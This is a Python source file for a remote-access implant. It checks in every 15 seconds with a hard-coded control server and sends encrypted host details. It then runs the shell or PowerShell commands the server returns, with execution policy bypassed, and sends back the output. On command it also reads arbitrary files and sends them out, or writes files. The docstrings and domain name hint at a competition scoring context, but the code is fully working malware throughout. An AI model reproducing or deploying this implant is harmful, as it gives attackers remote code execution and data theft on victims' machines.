import base64
import requests
import subprocess
import time
import platform
import json
from cryptography.fernet import Fernet

# Encryption setup
SECRET_KEY = b'7lJcf_dNt7Jhc87wCBcYO46b4XRy18upQmOKrij3B4k='
cipher = Fernet(SECRET_KEY)

# Failover list
C2_DOMAINS = ["https://midevil-scoring-engine.com"]

# Path to self-signed cert
if platform.system() == "Windows":
    CERT_PATH = r"C:\ProgramData\Microsoft\Network\Settings\nginx-selfsigned.crt"
else:
    CERT_PATH = r"/etc/ssl/certs/nginx-selfsigned.crt"


def get_system_info():
    """Gathers system metadata for the dashboard asset inventory."""
    info = {
        "hostname": platform.node(),
        "os": f"{platform.system()} {platform.release()}",
        "status": "Online"
    }
    return json.dumps(info)


def execute_file_pull(command):
    """Expected format: FILE_PULL_B64|<path_b64>"""
    try:
        _, path_b64 = command.split("|", 1)
        file_path = base64.b64decode(path_b64.encode()).decode(errors='replace')

        with open(file_path, "rb") as f:
            raw_bytes = f.read()

        payload = base64.b64encode(raw_bytes).decode()
        path_payload = base64.b64encode(file_path.encode()).decode()
        return f"FILE_DATA_B64|{path_payload}|{payload}"
    except Exception as e:
        err = base64.b64encode(str(e).encode()).decode()
        path = ""
        try:
            path = command.split("|", 1)[1]
        except Exception:
            path = ""
        return f"FILE_ERROR_B64|{path}|{err}"


def execute_file_push(command):
    """Expected format: FILE_PUSH_B64|<path_b64>|<content_b64>"""
    try:
        _, path_b64, content_b64 = command.split("|", 2)
        file_path = base64.b64decode(path_b64.encode()).decode(errors='replace')
        raw_bytes = base64.b64decode(content_b64.encode())

        with open(file_path, "wb") as f:
            f.write(raw_bytes)

        ok = base64.b64encode(f"WROTE:{len(raw_bytes)}".encode()).decode()
        return f"FILE_WRITE_OK_B64|{path_b64}|{ok}"
    except Exception as e:
        err = base64.b64encode(str(e).encode()).decode()
        path = ""
        try:
            path = command.split("|", 2)[1]
        except Exception:
            path = ""
        return f"FILE_WRITE_ERROR_B64|{path}|{err}"


def run_agent():
    my_hostname = platform.node()
    current_os = platform.system()
    print(f"[*] Agent [{my_hostname}] initialized on {current_os}. Beginning beaconing...")

    while True:
        for url in C2_DOMAINS:
            try:
                # 1. Prepare Heartbeat
                raw_info = get_system_info()
                encrypted_heartbeat = cipher.encrypt(raw_info.encode())

                # 2. Beacon Out (Check-in)
                response = requests.post(
                    f"{url}/checkin",
                    data=encrypted_heartbeat,
                    timeout=10,
                    verify=CERT_PATH
                )

                if response.status_code == 200:
                    encrypted_command = response.content
                    command = cipher.decrypt(encrypted_command).decode()

                    if command and command.lower() != "none":
                        print(f"[*] Executing: {command[:120]}")

                        if command.startswith("FILE_PULL_B64|"):
                            raw_result = execute_file_pull(command)
                        elif command.startswith("FILE_PUSH_B64|"):
                            raw_result = execute_file_push(command)
                        else:
                            # Normal command execution
                            if current_os == "Windows":
                                full_cmd = ["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", command]
                                raw_result = subprocess.check_output(full_cmd, stderr=subprocess.STDOUT, shell=True).decode(errors='replace')
                            else:
                                raw_result = subprocess.getoutput(command)

                        # 3. Format Result
                        formatted_result = f"{my_hostname}|{raw_result}"
                        encrypted_result = cipher.encrypt(formatted_result.encode())

                        # Send result back
                        requests.post(
                            f"{url}/result",
                            data=encrypted_result,
                            verify=CERT_PATH,
                            timeout=10
                        )
                        print("[+] Result transmitted.")

                    break

            except Exception as e:
                # Fallback for empty results/errors so the dashboard doesn't hang
                error_msg = f"{my_hostname}|Error executing command: {str(e)}"
                try:
                    requests.post(f"{url}/result", data=cipher.encrypt(error_msg.encode()), verify=CERT_PATH, timeout=5)
                except Exception:
                    pass
                print(f"[!] Connection failed for {url}: {e}")
                continue

        wait_time = 15
        print(f"[*] Beacon interval complete. Sleeping {wait_time}s...")
        time.sleep(wait_time)


if __name__ == "__main__":
    run_agent()